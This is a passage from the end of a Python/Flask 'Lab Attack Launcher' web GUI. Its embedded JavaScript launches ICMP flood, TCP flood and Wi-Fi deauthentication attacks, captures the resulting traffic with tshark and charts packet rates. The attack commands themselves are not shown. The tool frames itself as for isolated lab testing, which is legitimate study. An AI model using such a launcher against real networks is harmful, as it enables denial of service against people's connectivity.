  const atk = AMAP[current], vals = collectParams(atk);
  let f = '';
  if      (atk.id==='icmp_flood') f='icmp'+(vals.ip?' and host '+vals.ip:'');
  else if (atk.id==='tcp_flood')  f='tcp'+(vals.ip?' and host '+vals.ip:'')+(vals.port?' and port '+vals.port:'');
  else if (atk.id==='deauth')     f='wlan type mgt subtype deauth';
  else if (atk.id==='monitor')    f='not arp and not broadcast';
  document.getElementById('cap-filter').value = f;
}

// ── Validate ──────────────────────────────────────────────────────────────────
function validate(atk, vals) {
  for (const p of atk.params) {
    if (!p.required) continue;
    const wrap = document.getElementById('pf-'+p.id);
    if (wrap && wrap.classList.contains('hidden')) continue;
    if (!vals[p.id]) { alert('Field "'+p.label+'" is required.'); return false; }
    if (p.id==='ip') {
      const parts = vals[p.id].split('.');
      if (parts.length!==4||parts.some(x=>isNaN(x)||+x<0||+x>255)) {
        alert('"'+vals[p.id]+'" is not a valid IPv4 address.'); return false; }
    }
  }
  return true;
}

// ── Attack run/stop ───────────────────────────────────────────────────────────
let evtSrc = null;

function setAtkRunning(on) {
  document.getElementById('run-btn').disabled = on;
  const s = document.getElementById('stop-btn');
  s.disabled=!on; s.className=on?'btn-stop active':'btn-stop';
  const st = document.getElementById('atk-status');
  st.textContent=on?'\u25cf RUNNING':'\u25cf IDLE';
  st.style.color=on?'#e94560':'#4a5a6a';
}

function logLine(text, cls) {
  const log=document.getElementById('log'), span=document.createElement('span');
  if(cls)span.className=cls; span.textContent=text;
  log.appendChild(span); log.scrollTop=log.scrollHeight;
}

function runAttack() {
  const atk=AMAP[current], vals=collectParams(atk);
  if(!validate(atk,vals)) return;
  const cmd=buildCmd(atk,vals);
  if(!confirm('Launch:\n\n  '+cmd+'\n\nProceed in isolated lab environment?')) return;
  setAtkRunning(true);
  logLine('\n[LAUNCH] '+cmd+'\n','li');
  const qs=new URLSearchParams({id:current});
  Object.entries(vals).forEach(([k,v])=>qs.append(k,String(v)));
  evtSrc=new EventSource('/run?'+qs.toString());
  evtSrc.addEventListener('line',e=>logLine(e.data+'\n'));
  evtSrc.addEventListener('done',e=>{
    logLine('\n[EXIT] code '+e.data+'\n',e.data==='0'?'li':'lw');
    evtSrc.close();evtSrc=null;setAtkRunning(false);
  });
  evtSrc.addEventListener('error',()=>{
    logLine('\n[ERROR] Stream error.\n','le');
    evtSrc.close();evtSrc=null;setAtkRunning(false);
  });
}

function stopAttack() {
  fetch('/stop',{method:'POST'}).then(()=>logLine('\n[STOPPED] Attack terminated.\n','lw'));
  if(evtSrc){evtSrc.close();evtSrc=null;} setAtkRunning(false);
}

// ── Capture ───────────────────────────────────────────────────────────────────
function setCapRunning(on) {
  document.getElementById('cap-start-btn').className=on?'btn-cap active':'btn-cap';
  document.getElementById('cap-start-btn').disabled=on;
  const s=document.getElementById('cap-stop-btn');
  s.disabled=!on; s.className=on?'btn-stop active':'btn-stop';
  const st=document.getElementById('cap-status-txt');
  st.textContent=on?'\u25cf CAPTURING':'\u25cf IDLE';
  st.style.color=on?'#2ecc71':'#4a5a6a';
}

function capStart() {
  const iface  = document.getElementById('cap-iface').value.trim()||'wlan0';
  const filter = document.getElementById('cap-filter').value.trim();
  const dir    = document.getElementById('cap-dir').value.trim()||'/home/kali/Documents/pcapfiles';

  document.getElementById('cap-analyze-btn').disabled=true;
  document.getElementById('cap-dl-btn').disabled=true;
  document.getElementById('analysis-card').style.display='none';

  fetch('/capture/start',{
    method:'POST', headers:{'Content-Type':'application/json'},
    body:JSON.stringify({interface:iface,filter:filter,directory:dir}),
  })
  .then(r=>r.json())
  .then(d=>{
    setCapRunning(true);
    logLine('\n[CAPTURE] Started\n  File: '+d.path+'\n  Interface: '+iface+(filter?'\n  Filter: '+filter:'')+'\n','li');
    if(d.dir!==dir) logLine('[CAPTURE] Note: directory not writable, saved to '+d.dir+' instead\n','lw');
  })
  .catch(()=>logLine('\n[CAPTURE ERROR] Could not start tshark. Is it installed?\n  Run: sudo apt install tshark\n','le'));
}

function capStop() {
  fetch('/capture/stop',{method:'POST'})
  .then(r=>r.json())
  .then(d=>{
    setCapRunning(false);
    document.getElementById('cap-analyze-btn').disabled=false;
    document.getElementById('cap-dl-btn').disabled=false;
    logLine('\n[CAPTURE] Stopped.\n','lw');
    if(d.errors && d.errors.length>0){
      logLine('[TSHARK ERRORS]\n','le');
      d.errors.forEach(e=>logLine('  '+e+'\n','le'));
    }
  });
}

function capDownload() { window.location.href='/capture/download'; }

// ── Post-capture analysis & chart ─────────────────────────────────────────────
const PROTO_COLORS=['#e94560','#2ecc71','#e67e22','#3498db','#9b59b6','#1abc9c'];

function fmtBytes(b){
  if(b>=1073741824)return(b/1073741824).toFixed(2)+' GB';
  if(b>=1048576)return(b/1048576).toFixed(1)+' MB';
  if(b>=1024)return(b/1024).toFixed(1)+' KB';
  return b+' B';
}

function capAnalyze() {
  logLine('\n[ANALYZE] Reading pcap file...\n','li');
  document.getElementById('cap-analyze-btn').disabled=true;

  fetch('/capture/analyze')
  .then(r=>{
    if(!r.ok) return r.text().then(t=>{throw new Error(t);});
    return r.json();
  })
  .then(data=>{
    logLine('[ANALYZE] Done — '+data.total_packets.toLocaleString()+' packets over '+data.duration_s+'s\n','li');
    document.getElementById('cap-analyze-btn').disabled=false;
    showAnalysis(data);
  })
  .catch(err=>{
    logLine('[ANALYZE ERROR] '+err.message+'\n','le');
    document.getElementById('cap-analyze-btn').disabled=false;
  });
}

function showAnalysis(data) {
  // Show card
  const card=document.getElementById('analysis-card');
  card.style.display='block';
  document.getElementById('analysis-title').textContent='Analysis — '+data.file;

  // Summary numbers
  document.getElementById('s-pkts').textContent  = data.total_packets.toLocaleString();
  document.getElementById('s-bytes').textContent = fmtBytes(data.total_bytes);
  document.getElementById('s-peak').textContent  = data.peak_pps.toLocaleString()+' /s';
  document.getElementById('s-dur').textContent   = data.duration_s+'s';

  // Line chart — packets per second
  const lCtx=document.getElementById('line-chart').getContext('2d');
  if(lineChart) lineChart.destroy();
  lineChart=new Chart(lCtx,{
    type:'line',
    data:{
      labels: data.labels.map(l=>l+'s'),
      datasets:[{
        label:'Packets/sec',
        data:data.pps,
        borderColor:'#e94560',
        backgroundColor:'rgba(233,69,96,0.12)',
        tension:0.3, fill:true, pointRadius:data.labels.length>120?0:2,
        borderWidth:1.5,
      }]
    },
    options:{
      responsive:true, maintainAspectRatio:false, animation:false,
      scales:{
        x:{ticks:{maxTicksLimit:10,color:'#4a5a6a',font:{size:9}},grid:{color:'#1a1a30'}},
        y:{ticks:{color:'#4a5a6a',font:{size:9}},grid:{color:'#1a1a30'},beginAtZero:true,
           title:{display:true,text:'pkt/s',color:'#e94560',font:{size:9}}},
      },
      plugins:{legend:{labels:{color:'#c8d6e5',font:{size:9},boxWidth:10}}}
    }
  });

  // Doughnut — protocol breakdown
  const protos=data.protos, keys=Object.keys(protos);
  const dCanvas=document.getElementById('doughnut-chart');
  const noProtos=document.getElementById('no-protos');
  if(keys.length>0){
    dCanvas.style.display='block'; noProtos.style.display='none';
    const dCtx=dCanvas.getContext('2d');
    if(doughnutChart) doughnutChart.destroy();
    doughnutChart=new Chart(dCtx,{
      type:'doughnut',
      data:{
        labels:keys,
        datasets:[{data:keys.map(k=>protos[k]),
          backgroundColor:keys.map((_,i)=>PROTO_COLORS[i%PROTO_COLORS.length]),
          borderColor:'#0d0d1a',borderWidth:2}]
      },
      options:{
        responsive:true, maintainAspectRatio:false, animation:false,
        plugins:{legend:{position:'right',labels:{color:'#c8d6e5',font:{size:9},boxWidth:10,padding:6}}}
      }
    });
  } else {
    dCanvas.style.display='none'; noProtos.style.display='block';
  }

  card.scrollIntoView({behavior:'smooth', block:'start'});
}

// ── Init ──────────────────────────────────────────────────────────────────────
buildList();
selectAttack(ATTACKS[0].id);
</script>
</body>
</html>
"""


# ── Entry point ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lan_ip = s.getsockname()[0]
        s.close()
    except Exception:
        lan_ip = "unknown"

    print("\n  ╔══════════════════════════════════════════╗")
    print("  ║     Lab Attack Launcher — Web GUI        ║")
    print("  ╠══════════════════════════════════════════╣")
    print(f"  ║  Local:    http://127.0.0.1:5000          ║")
    print(f"  ║  Network:  http://{lan_ip:<24s}║")
    print("  ║                                          ║")
    print("  ║  Best for capture: ICMP or TCP flood     ║")
    print("  ║  Captures: /home/kali/Documents/pcapfiles║")
    print("  ╚══════════════════════════════════════════╝\n")

    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)